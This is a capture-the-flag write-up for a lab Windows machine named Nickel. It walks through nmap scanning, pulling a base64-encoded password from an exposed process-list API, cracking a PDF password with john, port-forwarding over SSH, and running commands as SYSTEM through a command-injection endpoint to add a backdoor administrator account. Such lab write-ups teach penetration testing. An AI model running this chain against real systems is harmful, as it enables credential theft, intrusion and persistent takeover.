# CTF Writeup: Nickel

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.242.99 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 03:44 EST
Warning: 192.168.242.99 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.242.99
Host is up (0.031s latency).
Not shown: 65488 closed tcp ports (reset), 30 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) [x]
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-11-04T08:43:50
|_Not valid after:  2026-05-06T08:43:50
|_ssl-date: 2025-11-05T08:48:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-11-05T08:47:28+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/5%OT=21%CT=1%CU=36851%PV=Y%DS=4%DC=T%G=Y%TM=690B0F6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=1
OS:02%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=FB%GCD=1%ISR=10A%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-05T08:47:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   28.33 ms 192.168.45.1
2   28.30 ms 192.168.45.254
3   28.39 ms 192.168.251.1
4   28.52 ms 192.168.242.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 250.63 seconds
```

Analyzing all the 3 running http websites. 8089 Seems to add functionality and :33333 seems to be the API. What was weird when exploring the source code is that we are getting forwarded to an public IP which is not accessible.

Fuzzing for endpoints, didn't give me any result. The only endpoint reachable is :8089.

Mapped DNS Name "NICKEL" to target ip in our local dns file.

```
sudo echo "192.168.242.99 NICKEL" | sudo tee -a /etc/hosts    
192.168.242.99 NICKEL
```

After checking up on walkthroughs I noted that the dhcp server is misconfigured and the initial ip address didn't get resoluted. The IP-Address starting with 169 is an APIPA Adress. When trying to curl an server response on the API Endpoints. It's not possible to get an proper response with an GET Request.

Intercepting the endpoint with BurpSuite will resolve in the Request being changed from GET to POST.
Let's try and curl the request with the initial target ip, instead of the APIPA Ip.

```
curl http://192.168.242.99:33333/list-current-deployments -X POST
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>
```

We weren't able to get an proper server response, due to the server requesting an Length.

Sending an request with Content-Length parameter included prompts us the actual server response, let's try to hit the other endpoints.

```
curl http://192.168.242.99:33333/list-current-deployments -X POST -H "Content-Length: 0"
<p>Not Implemented</p>
```

Hitting the 2nd api endpoint, provides us with an list of running processes, in one of the processes there is credentials.

```
curl http://192.168.242.99:33333/list-running-procs -X POST -H "Content-Length: 0"


name        : System Idle Process
commandline : 

name        : System
commandline : 

name        : Registry
commandline : 

name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : wininit.exe
commandline : 

name        : csrss.exe
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : Memory Compression
commandline : 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vm3dservice.exe
commandline : C:\Windows\system32\vm3dservice.exe

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : vm3dservice.exe
commandline : vm3dservice.exe -n

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3956855 /state1:0x41c64e6d

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : MicrosoftEdgeUpdate.exe
commandline : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe
```
```
ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

Attempting to log in with those credentials doesn't seem to work.

I'm assuming the password is encoded with Base64. At first i didn't check for it, since the string looks like an legit password, but it actually was encoded.

```
echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d        
NowiseSloopTheory139
```

Logged in via ssh.

```
ssh ariah@NICKEL
Microsoft Windows [Version 10.0.18362.1016]         
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
ariah@NICKEL C:\Users\ariah>
```

Retrieved local.txt in C:\Users\ariah\Desktop

```
d20500cd347f2c326c66c9e73560d3c2
```

I found an interesting file saved up in /ftp directory. It's an .pdf file called "Infrastructure.pdf". Let's download it locally and view it.
We can do so by connecting to ftp service.

Downloaded the file onto our local machine, unfortunately it requires password authentication in order to be viewed.

We can convert the .pdf file into .hash file using pdf2john & potentially bruteforce an password using john the ripper.

```
pdf2john Infrastructure.pdf > Infrastructure.hash
```

Bruteforcing an password. Gained passphrase for the .pdf file. Let's view it now.

```
john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infrastructure.pdf)     
1g 0:00:00:32 DONE (2025-11-05 08:29) 0.03048g/s 305006p/s 305006c/s 305006C/s arian69..ariadne01
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```

The file itselfs, tells us about an endpoint called "Nickel" in which we can execute commands. Since when clicking on the link nothing happens I'm assuming we can only access this service internally. 

Viewing running services on the target system. Provides us with the information about an running webserver on port 80 in the internal server.

```
PS C:\> netstat -ano  

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1916
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2004
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       844
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1000
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:8089           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:33333          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       992
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1828
  TCP    127.0.0.1:80           0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       1916
```

Portforwarding this webserver could potentially provide us with access to the endpoints.

```
ssh -N -L 0.0.0.0:80:192.168.242.99:80 ariah@192.168.242.99
ariah@192.168.242.99's password:
```

Viewed the server on http://127.0.0.1

```
dev-api started at 2024-08-02T13:35:17 
```

The server response confirmed that we now have access to the system.
Since we know there is an endpoint which is configured that provides us command injections, let's try it.

```
dev-api started at 2024-08-02T13:35:17

nt authority\system

```

It works! The best possible thing we can do is now adding an user with administrator rights in order to get persistence.

```
net user lukas pass /add
net localgroup Administrators lukas /add
net localgroup "Remote Desktop Users" lukas /add
```

1.) Adding user "lukas".

```
http://127.0.0.1/?net%20user%20lukas%20pass%20/add
```

2.) Assigning user "lukas" to Administrators group.

```
http://127.0.0.1/?net%20localgroup%20Administrators%20lukas%20/add
```

Logged in via ssh using lukas:pass

```
ssh lukas@192.168.242.99
```

Retrieved proof.txt in C:\Users\Administrator\Desktop

```
9e6ce0902dfaf9877ba2130fbe52b7ad
```
